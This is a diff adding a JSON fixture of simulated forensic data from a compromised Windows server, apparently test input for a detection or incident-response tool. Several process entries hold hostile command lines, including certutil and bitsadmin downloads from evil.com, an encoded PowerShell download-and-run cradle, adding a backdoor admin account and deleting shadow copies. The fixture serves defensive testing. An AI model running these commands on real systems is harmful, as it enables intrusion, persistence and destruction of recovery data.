@@ -1,0 +1,203 @@
+{
+  "host_basic": {
+    "hostname": "SRV-WEB-PROD-01",
+    "ip_address": "192.168.10.55",
+    "os_type": "windows",
+    "os_version": "Windows Server 2019"
+  },
+
+  "processes": [
+    {
+      "pid": 1024, "name": "svch0st.exe", "ppid": 500,
+      "command_line": "svch0st.exe -k netsvcs",
+      "user": "SYSTEM", "integrity": "system",
+      "signature_verified": false, "whitelisted": false,
+      "session": 0, "state": "running"
+    },
+    {
+      "pid": 2048, "name": "c0balt-str1ke.exe", "ppid": 1024,
+      "command_line": "c0balt-str1ke.exe --beacon 10.0.0.100:8443 --sleep 30",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": false, "whitelisted": false,
+      "session": 1, "state": "running"
+    },
+    {
+      "pid": 3072, "name": "powershell.exe", "ppid": 2048,
+      "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAeABlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": true, "whitelisted": false,
+      "session": 1, "state": "running",
+      "parent_name": "c0balt-str1ke.exe"
+    },
+    {
+      "pid": 4096, "name": "python.exe", "ppid": 3072,
+      "command_line": "python.exe -c \"exec(open('C:\\\\Windows\\\\Temp\\\\payload.py').read())\"",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": false, "whitelisted": false,
+      "session": 1, "state": "running",
+      "memory_sections": [
+        {"type": "pe_in_memory", "address": "0x7ffe0000", "size": 65536, "protection": "RWX"},
+        {"type": "injection", "address": "0x10000000", "size": 4096, "protection": "RWX"},
+        {"type": "is_anonymous_rwx", "address": "0x20000000", "size": 8192, "protection": "RWX"}
+      ]
+    },
+    {
+      "pid": 5120, "name": "mshta.exe", "ppid": 1024,
+      "command_line": "mshta.exe javascript:vbscript:Execute(\"CreateObject('WScript.Shell').Run('powershell -enc ...')\")",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": true, "whitelisted": false,
+      "parent_name": "svch0st.exe"
+    },
+    {
+      "pid": 6144, "name": "wmiprvse.exe", "ppid": 1024,
+      "command_line": "C:\\Windows\\System32\\wbem\\wmiprvse.exe -Embedding",
+      "user": "NETWORK SERVICE", "integrity": "system",
+      "signature_verified": true, "whitelisted": false,
+      "parent_name": "svch0st.exe"
+    },
+    {
+      "pid": 7168, "name": "cmd.exe", "ppid": 2048,
+      "command_line": "cmd.exe /c whoami && net user hacker P@ssw0rd /add && vssadmin delete shadows /all",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": true, "whitelisted": false,
+      "uptime_seconds": 15
+    },
+    {
+      "pid": 8192, "name": "rundll32.exe", "ppid": 1024,
+      "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval('new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")')",
+      "user": "SYSTEM", "integrity": "system",
+      "signature_verified": true, "whitelisted": false,
+      "parent_name": "svch0st.exe"
+    },
+    {
+      "pid": 9216, "name": "java.exe", "ppid": 1024,
+      "command_line": "java -javaagent:evil-agent.jar -jar webapp.jar",
+      "user": "LOCAL SERVICE", "integrity": "medium",
+      "signature_verified": false, "whitelisted": false,
+      "session": 0, "state": "running"
+    },
+    {
+      "pid": 1337, "name": "certutil.exe", "ppid": 3072,
+      "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\update.exe",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": true, "whitelisted": false
+    },
+    {
+      "pid": 4141, "name": "bitsadmin.exe", "ppid": 3072,
+      "command_line": "bitsadmin /transfer job http://evil.com/backdoor.dll C:\\Windows\\Temp\\backdoor.dll",
+      "user": "Administrator", "integrity": "high",
+      "signature_verified": true, "whitelisted": false
+    }
+  ],
+
+  "network_connections": [
+    {"pid": 2048, "process_name": "c0balt-str1ke.exe", "remote_addr": "10.0.0.100", "remote_port": 8443,
+     "protocol": "tcp", "state": "ESTABLISHED", "direction": "outbound"},
+    {"pid": 3072, "process_name": "powershell.exe", "remote_addr": "45.155.205.233", "remote_port": 443,
+     "protocol": "tcp", "state": "ESTABLISHED", "direction": "outbound"},
+    {"pid": 4096, "process_name": "python.exe", "remote_addr": "185.220.101.34", "remote_port": 4444,
+     "protocol": "tcp", "state": "ESTABLISHED", "direction": "outbound"},
+    {"pid": 9216, "process_name": "java.exe", "remote_addr": "185.220.101.34", "remote_port": 8443,
+     "protocol": "tcp", "state": "ESTABLISHED", "direction": "outbound"},
+    {"pid": 7168, "process_name": "cmd.exe", "remote_addr": "8.8.8.8", "remote_port": 53,
+     "protocol": "udp", "state": "CLOSED", "direction": "outbound"},
+    {"pid": 3072, "process_name": "powershell.exe", "remote_addr": "94.102.61.77", "remote_port": 8080,
+     "protocol": "tcp", "state": "ESTABLISHED", "direction": "outbound"}
+  ],
+
+  "webshells": [
+    {
+      "path": "C:\\inetpub\\wwwroot\\uploads\\cmd.aspx",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "size_bytes": 2048,
+      "last_modified": "2026-07-10T14:22:00Z",
+      "suspicious_funcs": ["eval", "Execute", "Run"],
+      "obfuscation_score": 0.85,
+      "behinder_signal": true,
+      "godzilla_signal": false,
+      "matched_patterns": ["new ActiveXObject", "WScript.Shell", "eval(base64"]
+    },
+    {
+      "path": "/var/www/html/wp-content/plugins/fake-seo/shell.php",
+      "sha256": "a1b2c3e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b78",
+      "size_bytes": 1536,
+      "last_modified": "2026-07-11T03:15:00Z",
+      "suspicious_funcs": ["system", "base64_decode", "file_get_contents", "proc_open"],
+      "obfuscation_score": 0.92,
+      "behinder_signal": false,
+      "godzilla_signal": true,
+      "matched_patterns": ["$_REQUEST", "eval(base64_decode", "system("]
+    }
+  ],
+
+  "memory_shells": [
+    {
+      "pid": 9216,
+      "process_name": "java.exe",
+      "type": "filter",
+      "class_name": "javax.servlet.filter.EvilFilter",
+      "url_pattern": "/*",
+      "mapping_source": "agent",
+      "agent_jar": "evil-agent.jar",
+      "classloader_source": "unknown",
+      "c2_address": "185.220.101.34:8443",
+      "confidence": 0.95
+    }
+  ],
+
+  "auto_runs": [
+    {"type": "registry_run", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+     "value": "SvchostHelper", "data": "C:\\Windows\\Temp\\svch0st.exe", "suspicious": true},
+    {"type": "registry_run", "key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+     "value": "OneDriveUpdate", "data": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\backdoor.dll", "suspicious": true}
+  ],
+
+  "services": [
+    {"name": "FakeUpdateSvc", "display_name": "Windows Update Helper Service",
+     "path": "C:\\Windows\\Temp\\svch0st.exe", "start_type": "auto", "status": "running",
+     "user": "LocalSystem", "description": "伪装成 Windows 更新的持久化服务"},
+    {"name": "RemoteAccess", "display_name": "Remote Access Service",
+     "path": "C:\\Windows\\Temp\\backdoor.dll", "start_type": "auto", "status": "running",
+     "user": "LocalSystem", "description": "未知远程访问服务"}
+  ],
+
+  "scheduled_tasks": [
+    {"name": "SystemMaintenance", "command": "powershell -enc SQBFAFgAKABOAGUAdwA...",
+     "trigger": "daily", "user": "SYSTEM", "suspicious": true},
+    {"name": "AdobeFlashUpdate", "command": "C:\\Windows\\Temp\\svch0st.exe",
+     "trigger": "logon", "user": "Administrator", "suspicious": true}
+  ],
+
+  "files": [
+    {"path": "C:\\Windows\\Temp\\svch0st.exe",
+     "sha256": "f4k3h4sh000000000000000000000000000000000000000000000000000001",
+     "suspicious": true, "reason": "未签名 + 伪装 svchost 命名 + 异常 Temp 路径"},
+    {"path": "C:\\Windows\\Temp\\backdoor.dll",
+     "sha256": "b4ckd00r0000000000000000000000000000000000000000000000000000002",
+     "suspicious": true, "reason": "未知 DLL"}
+  ],
+
+  "file_hashes": [
+    {"path": "C:\\Windows\\Temp\\svch0st.exe",
+     "sha256": "f4k3h4sh000000000000000000000000000000000000000000000000000001",
+     "is_signed": false, "signer": ""},
+    {"path": "C:\\Windows\\Temp\\backdoor.dll",
+     "sha256": "b4ckd00r0000000000000000000000000000000000000000000000000000002",
+     "is_signed": false, "signer": ""},
+    {"path": "C:\\Windows\\System32\\svchost.exe",
+     "sha256": "aabbccdd0000000000000000000000000000000000000000000000000000003",
+     "is_signed": true, "signer": "Microsoft Corporation"}
+  ],
+
+  "registry_keys": [
+    {"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SvchostHelper",
+     "value": "SvchostHelper", "data": "C:\\Windows\\Temp\\svch0st.exe", "type": "REG_SZ"},
+    {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeUpdateSvc",
+     "value": "ImagePath", "data": "C:\\Windows\\Temp\\svch0st.exe", "type": "REG_EXPAND_SZ"}
+  ],
+
+  "wmi_subscriptions": [
+    {"name": "SystemHealthCheck", "query": "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'",
+     "consumer": "CommandLineEventConsumer", "command": "powershell -enc ...", "suspicious": true}
+  ]
+}
